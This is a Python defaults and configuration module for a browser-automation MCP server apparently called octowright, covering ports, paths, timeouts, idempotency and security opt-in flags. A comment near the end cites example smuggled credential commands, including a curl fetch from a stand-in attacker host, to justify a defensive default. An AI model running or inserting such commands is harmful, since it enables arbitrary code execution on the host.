# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

from __future__ import annotations

import getpass
import os
import platform
import subprocess
from functools import lru_cache
from pathlib import Path

from octowright.config_paths import user_cache_dir, user_config_dir, user_state_dir

# Default OTel service name. Set as an env-var default (not a constant) so
# provide.telemetry.setup_telemetry() picks it up via its env-driven
# config, while still letting any user-supplied PROVIDE_TELEMETRY_SERVICE_NAME
# win. defaults.py is imported by every CLI entrypoint via the modules
# they load, so this lands before setup_telemetry() runs.
os.environ.setdefault("PROVIDE_TELEMETRY_SERVICE_NAME", "octowright")

_DEFAULT_PORT = os.environ.get("OCTOWRIGHT_HTTP_PORT", "6286")
DEFAULT_URL = os.environ.get("OCTOWRIGHT_DEFAULT_URL", f"http://127.0.0.1:{_DEFAULT_PORT}/new-tab")

# Runtime-resolved port — set by the HTTP server once it successfully binds
# (which may differ from _DEFAULT_PORT when auto-bump fires). All internal
# browser-launch paths use get_default_url() so no-URL launches always point
# at the real port.
_bound_http_port: int | None = None


def set_actual_http_port(port: int) -> None:
    global _bound_http_port
    _bound_http_port = port


def get_default_url() -> str:
    if os.environ.get("OCTOWRIGHT_DEFAULT_URL"):
        return os.environ["OCTOWRIGHT_DEFAULT_URL"]
    port = _bound_http_port if _bound_http_port is not None else int(_DEFAULT_PORT)
    return f"http://127.0.0.1:{port}/new-tab"


@lru_cache(maxsize=1)
def _detect_git_repo_name() -> str | None:
    """Return the basename of the nearest git repo root, or None."""
    try:
        r = subprocess.run(  # nosec B603 B607 - fixed git argv, no user input
            ["git", "rev-parse", "--show-toplevel"],
            capture_output=True,
            text=True,
            timeout=2,
        )
        if r.returncode == 0:
            return Path(r.stdout.strip()).name or None
    except Exception:
        pass
    return None


@lru_cache(maxsize=1)
def _read_project_config() -> dict[str, object]:
    """Walk up from CWD looking for .octowright/config.yaml.

    Returns the parsed YAML dict, or {} if not found / unreadable.
    The file can set: label, persona, profile.
    """
    try:
        import yaml

        for parent in [Path.cwd(), *Path.cwd().parents]:
            cfg = parent / ".octowright" / "config.yaml"
            if cfg.is_file():
                return yaml.safe_load(cfg.read_text()) or {}
            if parent == parent.parent:
                break
    except Exception:
        pass
    return {}


def project_config_str(cfg: dict[str, object], key: str) -> str:
    """Return ``cfg[key]`` as a stripped string, treating a missing key OR a
    null value as ``""``. PyYAML parses a bare ``key:`` (no value) as ``None``,
    and ``str(None)`` would otherwise leak the literal ``"None"`` into a
    label/persona/profile. Shared by ``get_default_label`` and the launch
    config resolution so the null-safety lives in one place."""
    return str(cfg.get(key) or "").strip()


@lru_cache(maxsize=1)
def get_default_label() -> str:
    """Default browser label, in priority order:

    1. OCTOWRIGHT_DEFAULT_LABEL env var
    2. ``label:`` in the nearest .octowright/config.yaml
    3. Basename of the nearest git repo root
    4. Current username
    """
    env = os.environ.get("OCTOWRIGHT_DEFAULT_LABEL", "").strip()
    if env:
        return env
    cfg_label = project_config_str(_read_project_config(), "label")
    if cfg_label:
        return cfg_label
    repo = _detect_git_repo_name()
    if repo:
        return repo
    try:
        return getpass.getuser()
    except Exception:
        return "user"


DEFAULT_VIEWPORT_W = int(os.environ.get("OCTOWRIGHT_VIEWPORT_W", "1280"))
DEFAULT_VIEWPORT_H = int(os.environ.get("OCTOWRIGHT_VIEWPORT_H", "800"))

_REPO_ROOT = Path(__file__).resolve().parents[2]
_CONFIG_DIR = user_config_dir()
_STATE_DIR = user_state_dir()
_CACHE_DIR = user_cache_dir()
_DEFAULT_RECORDINGS = _STATE_DIR / "sessions"
_DEFAULT_PROFILES = _CONFIG_DIR / "profiles"
_DEFAULT_SCENARIOS = _CONFIG_DIR / "scenarios"

RECORDINGS_DIR = Path(os.environ.get("OCTOWRIGHT_RECORDINGS", str(_DEFAULT_RECORDINGS)))
PROFILES_DIR = Path(os.environ.get("OCTOWRIGHT_PROFILES_DIR", str(_DEFAULT_PROFILES)))
SCENARIOS_DIR = Path(os.environ.get("OCTOWRIGHT_SCENARIOS_DIR", str(_DEFAULT_SCENARIOS)))
SCENARIO_TEMPLATES_DIR = SCENARIOS_DIR / "templates"
CAPTURES_DIR = Path(os.environ.get("OCTOWRIGHT_CAPTURES_DIR", str(_CACHE_DIR / "captures")))
CAPTURE_MAX_TOTAL_BYTES = int(os.environ.get("OCTOWRIGHT_CAPTURE_MAX_TOTAL_BYTES", str(50 * 1024 * 1024)))
CAPTURE_TTL_SECONDS = float(os.environ.get("OCTOWRIGHT_CAPTURE_TTL_SECONDS", str(7 * 86400)))
SESSION_MANIFEST_PATH = Path(os.environ.get("OCTOWRIGHT_SESSION_MANIFEST", str(_STATE_DIR / "session-manifest.json")))

# Macro JSON storage. Default sits next to PROFILES_DIR so the user-config
# tree stays in one place. Override for per-test isolation.
MACROS_DIR = Path(os.environ.get("OCTOWRIGHT_MACROS_DIR", str(PROFILES_DIR.parent / "macros")))

# Golden snapshot storage (accessibility-tree golden assertions).
GOLDENS_DIR = Path(os.environ.get("OCTOWRIGHT_GOLDENS_DIR", str(_CONFIG_DIR / "goldens")))

# Upload staging directory: the only filesystem location an LLM-driven
# browser_set_input_files call may read from by default. Additional roots can
# be allowlisted via OCTOWRIGHT_UPLOAD_ROOTS (os.pathsep-separated). The
# current working directory is always permitted so test fixtures resolve.
UPLOAD_STAGING_DIR = Path(os.environ.get("OCTOWRIGHT_UPLOAD_STAGING_DIR", str(_CONFIG_DIR / "uploads")))
UPLOAD_EXTRA_ROOTS_RAW = os.environ.get("OCTOWRIGHT_UPLOAD_ROOTS", "")

# Octowright Advisor local state: preferences, lightweight usage summaries,
# and suggestion cooldown data. Override for tests or isolated deployments.
ADVISOR_STATE_PATH = Path(os.environ.get("OCTOWRIGHT_ADVISOR_STATE", str(_CONFIG_DIR / "advisor.json")))

# Singleton-leader lockfile. Override via OCTOWRIGHT_LOCK_PATH for hermetic
# tests that spawn a real daemon without touching the user's actual lockfile.
LOCK_PATH = Path(os.environ.get("OCTOWRIGHT_LOCK_PATH", str(_STATE_DIR / "octowright.lock")))

# Codex CLI install root for the skill-distribution copy step. CODEX_HOME is
# a Codex-defined env var, not OCTOWRIGHT_*; the resolved path is
# expanduser()'d at consumer-call time so ~ in the env value still works.
CODEX_HOME = os.environ.get("CODEX_HOME", "~/.codex")

# Claude Code skill install root.
CLAUDE_HOME = os.environ.get("CLAUDE_HOME", "~/.claude")

# Antigravity CLI (agy) config root for the skill-distribution copy step.
# agy shares ~/.gemini/config as its plugin store; override ANTIGRAVITY_HOME
# to redirect installs to a test tree without touching the user's live config.
ANTIGRAVITY_HOME = os.environ.get("ANTIGRAVITY_HOME", "~/.gemini/config")


def active_profile_raw() -> str:
    """Read OCTOWRIGHT_PROFILE's raw env value for diagnostic display.

    Lives here so all OCTOWRIGHT_* env reads route through defaults.py.
    Consumers (octowright_status, selftest) echo this back to the user as
    the 'active profile' string. The actual filter logic lives in
    server.profiles.active_filter() — this is just the unparsed input.
    """
    return os.environ.get("OCTOWRIGHT_PROFILE", "").strip()


# Octowright defaults to HEADED mode. The whole point of this server is giving
# humans a window they can watch (and sometimes drive by hand), so headless is
# only correct when the caller has a specific background-verification reason —
# scripted health checks, parity runs, CI.
#
# Resolution order for the default headless value (each step short-circuits):
#   1. OCTOWRIGHT_HEADLESS=1 / =0 — explicit override always wins.
#   2. CI=true (set by GitHub Actions, GitLab, CircleCI, Travis, etc.) → headless.
#   3. Linux session with no $DISPLAY and no $WAYLAND_DISPLAY (SSH, no X server,
#      headless container) → headless.
#   4. Otherwise → headed.
def _detect_headless_default() -> bool:
    explicit = os.environ.get("OCTOWRIGHT_HEADLESS")
    if explicit is not None:
        return explicit == "1"
    if os.environ.get("CI", "").lower() in ("true", "1", "yes"):
        return True
    # macOS always has a window server; only Linux can be display-less here.
    return platform.system() == "Linux" and not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")


HEADLESS_DEFAULT = _detect_headless_default()

# When OCTOWRIGHT_PROTECT_BROWSERS=1, every browser is protected at launch and
# browser_close / browser_close_all require force=True. Per-launch override via
# the browser_launch `protected` parameter.
PROTECT_BROWSERS_DEFAULT: bool = os.environ.get("OCTOWRIGHT_PROTECT_BROWSERS", "").strip() == "1"
PROTECT_HEADED_DEFAULT: bool = os.environ.get("OCTOWRIGHT_PROTECT_HEADED", "1").strip() != "0"  # headed default
BADGE_OPACITY: float = float(os.environ.get("OCTOWRIGHT_BADGE_OPACITY", "0.35"))

SUPPORTED_KINDS = ("chromium", "firefox", "webkit")

DEFAULT_NAV_TIMEOUT_MS = int(os.environ.get("OCTOWRIGHT_NAV_TIMEOUT_MS", "30000"))
DEFAULT_ACTION_TIMEOUT_MS = int(os.environ.get("OCTOWRIGHT_ACTION_TIMEOUT_MS", "15000"))
# Wall-clock budget for one aria-tree snapshot. A heavy DOM can make
# locator.aria_snapshot() run long enough to blow BRIDGE_REQUEST_TIMEOUT_SECONDS
# (20s) — which the agent can't distinguish from a disconnect. Capped below it so
# browser_snapshot degrades to a typed result ("use read_markdown / a scoped
# selector") instead of hanging until the transport gives up.
SNAPSHOT_TIMEOUT_SECONDS = float(os.environ.get("OCTOWRIGHT_SNAPSHOT_TIMEOUT_SECONDS", "12"))
# Total wall-clock budget for a browser launch MCP tool call. This must stay
# below common MCP client call deadlines (120s) so a wedged Playwright launch
# returns a normal tool error instead of making the client report a transport
# timeout.
BROWSER_LAUNCH_TIMEOUT_SECONDS = float(os.environ.get("OCTOWRIGHT_BROWSER_LAUNCH_TIMEOUT_SECONDS", "90"))

# Follower bridge protection. These defaults are intentionally below common MCP
# client tool-call deadlines so bridge failures return explicit JSON-RPC errors
# instead of leaving the host to time out at ~120s.
BRIDGE_REQUEST_TIMEOUT_SECONDS = float(os.environ.get("OCTOWRIGHT_BRIDGE_REQUEST_TIMEOUT_SECONDS", "20"))
BRIDGE_CONNECT_TIMEOUT_SECONDS = float(os.environ.get("OCTOWRIGHT_BRIDGE_CONNECT_TIMEOUT_SECONDS", "10"))
BRIDGE_RECONNECT_MAX_SECONDS = float(os.environ.get("OCTOWRIGHT_BRIDGE_RECONNECT_MAX_SECONDS", "5"))
BRIDGE_HEALTH_INTERVAL_SECONDS = float(os.environ.get("OCTOWRIGHT_BRIDGE_HEALTH_INTERVAL_SECONDS", "2"))
BRIDGE_HEALTH_MAX_FAILURES = int(os.environ.get("OCTOWRIGHT_BRIDGE_HEALTH_MAX_FAILURES", "2"))
BRIDGE_STATE_PATH = Path(os.environ.get("OCTOWRIGHT_BRIDGE_STATE", str(_STATE_DIR / "bridge-state.json")))

# Per-tool override of the flat BRIDGE_REQUEST_TIMEOUT_SECONDS in-flight deadline,
# keyed by MCP tool name (the ``name`` field of a ``tools/call``). Some tools run
# legitimately longer than 20s: a browser_launch has a 90s budget
# (BROWSER_LAUNCH_TIMEOUT_SECONDS) and a multi-step macro_run can take minutes —
# without a larger floor the bridge returns a spurious -32000 while the leader is
# still working, and the macro half-applies. Unlisted tools use the flat default.
# When a tool emits MCP progress, the follower re-arms these deadlines on each
# ping (see proxy_supervisor); the floor here covers the pre-first-progress window
# and tools that emit no progress at all.
BRIDGE_TOOL_TIMEOUTS: dict[str, float] = {
    "browser_launch": float(
        os.environ.get("OCTOWRIGHT_BRIDGE_BROWSER_LAUNCH_TIMEOUT_SECONDS", str(BROWSER_LAUNCH_TIMEOUT_SECONDS + 15))
    ),
    "macro_run": float(os.environ.get("OCTOWRIGHT_BRIDGE_MACRO_RUN_TIMEOUT_SECONDS", "120")),
    "macro_run_sequence": float(os.environ.get("OCTOWRIGHT_BRIDGE_MACRO_SEQUENCE_TIMEOUT_SECONDS", "180")),
    # evaluate runs arbitrary caller JS with up to ~30s page.evaluate timeout
    "browser_evaluate": float(os.environ.get("OCTOWRIGHT_BRIDGE_BROWSER_EVALUATE_TIMEOUT_SECONDS", "60")),
    # fill/type carry up to 15s Playwright action timeout — 60s leaves 45s bridge margin
    "browser_fill": float(os.environ.get("OCTOWRIGHT_BRIDGE_BROWSER_FILL_TIMEOUT_SECONDS", "60")),
    "browser_type": float(os.environ.get("OCTOWRIGHT_BRIDGE_BROWSER_TYPE_TIMEOUT_SECONDS", "60")),
    # navigate uses page.goto() with DEFAULT_NAV_TIMEOUT_MS (30s) — 60s keeps parity
    "browser_navigate": float(os.environ.get("OCTOWRIGHT_BRIDGE_BROWSER_NAVIGATE_TIMEOUT_SECONDS", "60")),
    # click can trigger a navigation, inheriting the 30s nav timeout
    "browser_click": float(os.environ.get("OCTOWRIGHT_BRIDGE_BROWSER_CLICK_TIMEOUT_SECONDS", "45")),
    # wait_for is an explicit waiting primitive; 90s accommodates typical settle polls
    "browser_wait_for": float(os.environ.get("OCTOWRIGHT_BRIDGE_BROWSER_WAIT_FOR_TIMEOUT_SECONDS", "90")),
}

# Max re-sends of an in-flight request after a reconnect (idempotent resume).
BRIDGE_RESUME_MAX_ATTEMPTS = int(os.environ.get("OCTOWRIGHT_BRIDGE_RESUME_MAX_ATTEMPTS", "3"))

# Hard-exit grace after stdin EOF: ensures the follower doesn't outlive its client
# when remote SSE teardown wedges and ignores anyio cancellation.
FOLLOWER_EXIT_BACKSTOP_SECONDS = float(os.environ.get("OCTOWRIGHT_FOLLOWER_EXIT_BACKSTOP_SECONDS", "5"))

# Leader-side idempotency cache. The follower injects a stable
# ``octowrightIdempotencyKey`` into each tools/call's _meta and re-sends it
# verbatim on resume; the leader caches the result by key so a re-sent
# side-effectful call runs at most once instead of double-executing.
# Inline truthy parse (matches _parse_bool_env, which is defined later in this file).
IDEMPOTENCY_ENABLED = os.environ.get("OCTOWRIGHT_IDEMPOTENCY", "1").strip().lower() not in {"0", "false", "no", "off"}
# TTL measured from result-store time. MUST exceed the maximum reconnect-to-resend
# window so a DONE entry is never evicted before the bridge re-sends it:
#   BRIDGE_RESUME_MAX_ATTEMPTS * (BRIDGE_CONNECT_TIMEOUT_SECONDS + BRIDGE_RECONNECT_MAX_SECONDS)
#   = 3 * (10 + 5) = 45s.  Default 180s keeps a ~4x margin; keep this invariant if
# you retune the bridge timeouts above.
IDEMPOTENCY_TTL_SECONDS = float(os.environ.get("OCTOWRIGHT_IDEMPOTENCY_TTL_SECONDS", "180"))
IDEMPOTENCY_MAX_ENTRIES = int(os.environ.get("OCTOWRIGHT_IDEMPOTENCY_MAX_ENTRIES", "256"))
# Oversize UTF-8 representations leave an authoritative no-rerun terminal marker,
# bounding retained result memory without repeating a possibly side-effectful tool.
IDEMPOTENCY_MAX_RESULT_BYTES = int(os.environ.get("OCTOWRIGHT_IDEMPOTENCY_MAX_RESULT_BYTES", "1048576"))
# Resend wait on an in-progress producer before its outcome is called UNKNOWN. MUST
# exceed the longest call the heartbeat sustains (_heartbeat.HEARTBEAT_MAX_SECONDS).
IDEMPOTENCY_INPROGRESS_WAIT_SECONDS = float(os.environ.get("OCTOWRIGHT_IDEMPOTENCY_INPROGRESS_WAIT_SECONDS", "630"))

# Per-action delay applied to macros, useful for visually following execution.
# Sleep happens AFTER pushing status to the pill and BEFORE dispatching the
# action, so the pill reflects the upcoming action while the user gets time
# to see it. 0 disables. Override per-call via the `slowmo_ms` arg on
# run_macro / macro_run / macro_run_sequence.
MACRO_SLOWMO_MS = int(os.environ.get("OCTOWRIGHT_MACRO_SLOWMO_MS", "0"))

# Cap on distinct macro-name label values applied to macro_run_total /
# macro_run_duration_seconds metrics. Long-lived deployments with programmatic
# macro generation could grow the per-label timeseries count without bound,
# blowing up Prometheus storage. Once the cap is exceeded, additional names
# collapse to a single ``"(overflow)"`` label so cardinality stays bounded.
METRICS_MACRO_LABEL_CAP = int(os.environ.get("OCTOWRIGHT_METRICS_MACRO_LABEL_CAP", "256"))

# HTTP debugger / dashboard sidecar — runs alongside the MCP stdio server when
# `octowright serve` is invoked. Bind defaults to localhost only because the
# debugger UI exposes raw recordings, video, and trace data.
HTTP_HOST = os.environ.get("OCTOWRIGHT_HTTP_HOST", "127.0.0.1")
HTTP_PORT = int(os.environ.get("OCTOWRIGHT_HTTP_PORT", "6286"))
# When the configured port is in use, try this many higher ports before giving up.
HTTP_PORT_RETRIES = 5
DASHBOARD_REMOTE_ALLOWED_ENV = "OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD"
NETWORK_EVENT_LIMIT = int(os.environ.get("OCTOWRIGHT_NETWORK_EVENT_LIMIT", "5000"))


# Idle-watchdog: when ENABLED, `octowright serve` exits on its own once the pool
# has sat empty for this many seconds. The poll interval below controls how often
# the watchdog samples the pool — keep it short so shutdown is snappy.
#
# DEFAULT: DISABLED (None). The daemon holds live browser state, and its exit
# closes the follower's stdio — which breaks the MCP client's connection and
# drops every open browser mid-session, with no transparent wake (the user has
# to reconnect by hand). An idle daemon is cheap (one asyncio server, singleton-
# locked to one per machine) and dies on reboot, so staying up until an explicit
# `octowright restart` is the safer default. Opt back into auto-quit for CI /
# shared / resource-constrained hosts via OCTOWRIGHT_IDLE_GRACE=<seconds> or
# --idle-grace; force-disable with --keep-alive.
def _parse_idle_grace(raw: str | None) -> float | None:
    """Parse OCTOWRIGHT_IDLE_GRACE into a watchdog grace, or None to disable it.

    Returns None (watchdog off — the default) for: unset, blank, a non-positive
    number, an unparsable value, or the literals ``off`` / ``never`` / ``none``
    / ``disabled`` / ``0`` (case-insensitive). A positive number enables
    auto-quit after that many idle seconds.
    """
    if raw is None:
        return None
    text = raw.strip().lower()
    if text in ("", "0", "off", "never", "none", "disabled"):
        return None
    try:
        value = float(text)
    except ValueError:
        return None
    return value if value > 0 else None


IDLE_GRACE_SECONDS: float | None = _parse_idle_grace(os.environ.get("OCTOWRIGHT_IDLE_GRACE"))
IDLE_POLL_SECONDS = float(os.environ.get("OCTOWRIGHT_IDLE_POLL", "2"))


# Pool-wide cap on concurrently-open browsers. The pool is shared by EVERY MCP
# client connected to one leader, so this bounds the *total* live browsers
# across all of them — the lever against a single looping client filling the
# screen with windows AND against peak memory pressure that drives renderer
# crashes. Defaults ON at MAX_BROWSERS_DEFAULT. The gate lives in the pool layer
# (browser_pool.limits, at the roster.spawn_roster chokepoint + single-launch
# shims), so browser_launch / browser_quick_launch / browser_spawn_roster AND
# scenario_start (pool.spawn_roster directly) are all capped; internal relaunch /
# handoff / crash-recovery use pool.launch and are NOT capped (they recover an
# existing session). ``0``/``off``/``never``/``none``/``disabled`` disable it.
MAX_BROWSERS_DEFAULT = "32"


def _parse_max_browsers(raw: str | None) -> int | None:
    if raw is None:
        return None
    text = raw.strip().lower()
    if text in ("", "0", "off", "never", "none", "disabled"):
        return None
    try:
        value = int(text)
    except ValueError:
        return None
    return value if value > 0 else None


MAX_BROWSERS: int | None = _parse_max_browsers(os.environ.get("OCTOWRIGHT_MAX_BROWSERS", MAX_BROWSERS_DEFAULT))
# Two more env knobs live in their domain modules (this file is at its LOC ceiling): OCTOWRIGHT_MIN_FREE_MEMORY_MB -> sysresources.MIN_FREE_MEMORY_BYTES (H4b); OCTOWRIGHT_DRIVER_RELAUNCH -> browser_pool.driver_relaunch.DRIVER_RELAUNCH_MODE (H4a).

# Leader housekeeping cadence. A periodic in-leader task (see
# octowright.housekeeping) that (1) reaps browser processes orphaned when their
# Playwright driver died — they reparent to init and the pool can no longer
# close them, so they pile up in the Dock/tray — and (2) bounds the detached
# daemon's stderr log mid-run (it is otherwise only rotated at spawn time).
# Default 60s; ``0`` / ``off`` / ``never`` / ``none`` / ``disabled`` turns the
# loop off (orphans are then only swept at leader boot / ``octowright restart``).
HOUSEKEEPING_INTERVAL_SECONDS: float | None = _parse_idle_grace(os.environ.get("OCTOWRIGHT_HOUSEKEEPING_SECONDS", "60"))

# Per-cache LRU bound on `octowright.http.session_artifacts.SessionArtifactCache`.
# Each cache (artifacts, report, console index, downloads index, path-exists)
# is independently capped at this many entries so the global singleton can't
# grow indefinitely as more sessions are processed.
SESSION_ARTIFACT_CACHE_MAX_ENTRIES = int(os.environ.get("OCTOWRIGHT_SESSION_ARTIFACT_CACHE_MAX_ENTRIES", "256"))

# Per-cache LRU bound on the closed-session discovery caches in
# `octowright.http.discovery` (per-file launch-summary cache + per-dir
# recording-index cache). Bounds memory growth across long-running daemons
# that accumulate large recording histories.
DISCOVERY_CACHE_MAX_ENTRIES = int(os.environ.get("OCTOWRIGHT_DISCOVERY_CACHE_MAX_ENTRIES", "512"))

# TTL on the path-exists cache used by /downloads to avoid stat'ing every
# referenced file on every page load. Sized to dedupe stats within a single
# paginated request (sub-second) while still refreshing fast enough that a
# user manually deleting a download sees the UI catch up within a couple
# refreshes.
DOWNLOAD_PATH_EXISTS_TTL_SECONDS = float(os.environ.get("OCTOWRIGHT_DOWNLOAD_PATH_EXISTS_TTL_SECONDS", "2.0"))

# WebSocket /tail (per-session JSONL stream) cadence.
#
# - TAIL_POLL_SECONDS: interval between filesystem polls. ~1 Hz feels live
#   without hammering the file system.
# - TAIL_HEARTBEAT_SECONDS: maximum gap between empty keepalive frames on a
#   quiet stream. The loop only pushes when there's something new (events
#   or a live→closed transition), so this bounds how long a quiet
#   connection can stay silent before the client gets a liveness ping.
TAIL_POLL_SECONDS = float(os.environ.get("OCTOWRIGHT_TAIL_POLL_SECONDS", "1.0"))
TAIL_HEARTBEAT_SECONDS = float(os.environ.get("OCTOWRIGHT_TAIL_HEARTBEAT_SECONDS", "15.0"))

# WebSocket-frame cache flush cadence. Per-frame ``fh.flush()`` would
# add a syscall per inbound/outbound WS frame — for game servers or
# market-data feeds (thousands of frames per second) that becomes the
# dominant cost. Python's text-mode block buffer (~8KB) on its own
# would hold low-volume feeds out of the dashboard tail until the
# buffer fills. Compromise: flush when EITHER the frame count or the
# elapsed-time threshold is hit, whichever comes first. Tail polls at
# 1Hz by default so 250ms flush feels live; 32 frames keeps batches
# small enough that bursty feeds don't accumulate noticeable lag.
WEBSOCKET_CACHE_FLUSH_FRAMES = int(os.environ.get("OCTOWRIGHT_WEBSOCKET_CACHE_FLUSH_FRAMES", "32"))
WEBSOCKET_CACHE_FLUSH_SECONDS = float(os.environ.get("OCTOWRIGHT_WEBSOCKET_CACHE_FLUSH_SECONDS", "0.25"))

# SSE /api/dashboard/events cadence.
#
# - DASHBOARD_DISCONNECT_POLL_SECONDS: how often the streaming endpoint checks
#   ``request.is_disconnected()`` so a closed browser tab tears the SSE down
#   promptly. Sub-second to avoid stragglers in the test harness.
# - DASHBOARD_HEARTBEAT_SECONDS: max silent interval before emitting an SSE
#   ``: heartbeat`` comment. Under proxy idle-close (typically 60s) so the
#   stream stays open through reverse proxies.
DASHBOARD_DISCONNECT_POLL_SECONDS = float(os.environ.get("OCTOWRIGHT_DASHBOARD_DISCONNECT_POLL_SECONDS", "0.05"))
DASHBOARD_HEARTBEAT_SECONDS = float(os.environ.get("OCTOWRIGHT_DASHBOARD_HEARTBEAT_SECONDS", "15.0"))


def _parse_bool_env(name: str, default: bool) -> bool:
    """Truthy/falsy bool parser for env-driven flags. Accepts the usual
    spellings ('1'/'0', 'true'/'false', 'yes'/'no', 'on'/'off',
    case-insensitive). Unset → default."""
    raw = os.environ.get(name)
    if raw is None:
        return default
    return raw.strip().lower() not in {"0", "false", "no", "off"}


# Renderer-crash auto-recovery. A Playwright page.on("crash") leaves the browser
# alive with a dead renderer; reloading the page heals it without losing the
# session. ENABLED by default (set OCTOWRIGHT_CRASH_RECOVERY=off to disable).
# MAX bounds consecutive auto-recoveries before giving up (so a page that crashes
# on every reload doesn't loop); the counter resets after RESET_SECONDS of quiet,
# so occasional crashes over a long session keep recovering.
CRASH_RECOVERY_ENABLED: bool = _parse_bool_env("OCTOWRIGHT_CRASH_RECOVERY", True)
CRASH_RECOVERY_MAX = int(os.environ.get("OCTOWRIGHT_CRASH_RECOVERY_MAX", "3"))
CRASH_RECOVERY_RESET_SECONDS = float(os.environ.get("OCTOWRIGHT_CRASH_RECOVERY_RESET_SECONDS", "60"))
CRASH_RECOVERY_RELOAD_TIMEOUT_MS = float(os.environ.get("OCTOWRIGHT_CRASH_RECOVERY_RELOAD_TIMEOUT_MS", "15000"))


# HTTP RED metrics, recorded through provide.telemetry's TelemetryMiddleware
# (http.requests/errors/duration → OTLP). On by default; flip to 0/false/no/off
# to disable metric recording (auto_slo). Context propagation / log correlation
# stay on regardless. See octowright.http.app.build_app.
HTTP_METRICS_ENABLED = _parse_bool_env("OCTOWRIGHT_HTTP_METRICS", True)

# Record-time redaction of user-typed input values in the per-session JSONL
# recording. Without this, ``type_text`` and ``fill`` MCP calls write the
# literal value (passwords, API keys, MFA codes, …) into the stream that
# `/api/sessions/{id}/events` and the WebSocket `/tail` endpoint expose, so
# anyone with read access to a recording can recover the secret. The macro
# linter (`macros/lint.py`) only flags candidate credentials at save-time
# and is not a substitute.
#
# Modes:
#   - ``off``       — legacy behavior; never redact. Use only when you
#                     explicitly trust the recording sink.
#   - ``passwords`` — DEFAULT. Inspect the locator's DOM element type; if
#                     it is ``<input type="password">``, replace the
#                     recorded value with ``REDACTED_INPUT_PLACEHOLDER``.
#                     The page still receives the real value.
#   - ``all``       — Redact every typed/filled value regardless of element
#                     type. Useful for high-sensitivity workflows where any
#                     user-supplied value may be confidential.
INPUT_REDACTION_MODE = os.environ.get("OCTOWRIGHT_REDACT_INPUTS", "passwords").strip().lower() or "passwords"
REDACTED_INPUT_PLACEHOLDER = "<redacted:password>"

# Env var name controlling whether ``.py`` scenario files are loadable.
# ``.py`` scenarios run arbitrary Python at module import; default OFF so a
# scenarios dir on shared storage or a CI checkout can't be a code-execution
# vector. Operators who deliberately ship Python scenarios opt in by setting
# this to ``1``/``true``/``yes``/``on``.
ALLOW_PY_SCENARIOS_ENV = "OCTOWRIGHT_ALLOW_PY_SCENARIOS"


def allow_py_scenarios() -> bool:
    """Return True iff ``OCTOWRIGHT_ALLOW_PY_SCENARIOS`` opts into ``.py``
    scenario loading. Read at call time so tests can monkeypatch the env
    var without reloading the module."""
    return _parse_bool_env(ALLOW_PY_SCENARIOS_ENV, False)


# Env var name controlling whether persona credential ``*_cmd`` values may
# invoke a POSIX shell with ``-c`` (``bash -c "..."``, ``sh -c "..."``, etc.).
# Default OFF so persona YAML — which may come from shared storage or a
# CI-checked-in directory — can't smuggle arbitrary shell execution into the
# daemon. Operators who deliberately ship shell-style credential helpers opt
# in by setting this to ``1``/``true``/``yes``/``on``.
ALLOW_SHELL_CRED_CMDS_ENV = "OCTOWRIGHT_ALLOW_SHELL_CRED_CMDS"


def allow_shell_cred_cmds() -> bool:
    """Return True iff ``OCTOWRIGHT_ALLOW_SHELL_CRED_CMDS`` opts into
    ``bash -c`` (and equivalents) for persona credential cmds. Read at call
    time so tests can monkeypatch the env var without reloading the module."""
    return _parse_bool_env(ALLOW_SHELL_CRED_CMDS_ENV, False)


# Env var name controlling whether persona credential ``*_cmd`` values may
# invoke an arbitrary executable that is NOT on the static well-known
# credential-helper allowlist (see ``personas._CREDENTIAL_HELPER_ALLOWLIST``).
# Default OFF so persona YAML — which may come from shared storage or a
# CI-checked-in directory — can't smuggle an arbitrary binary onto the daemon
# host (``["/tmp/evil.sh"]``, ``["curl", "attacker.example/payload"]``, etc).
# Operators who deliberately ship custom credential helpers opt in by setting
# this to ``1``/``true``/``yes``/``on``.
ALLOW_ARBITRARY_CRED_CMDS_ENV = "OCTOWRIGHT_ALLOW_ARBITRARY_CRED_CMDS"


def allow_arbitrary_cred_cmds() -> bool:
    """Return True iff ``OCTOWRIGHT_ALLOW_ARBITRARY_CRED_CMDS`` opts into
    running argv-form credential cmds whose executable basename is not on
    the static well-known helper allowlist. Read at call time so tests can
    monkeypatch the env var without reloading the module."""
    return _parse_bool_env(ALLOW_ARBITRARY_CRED_CMDS_ENV, False)
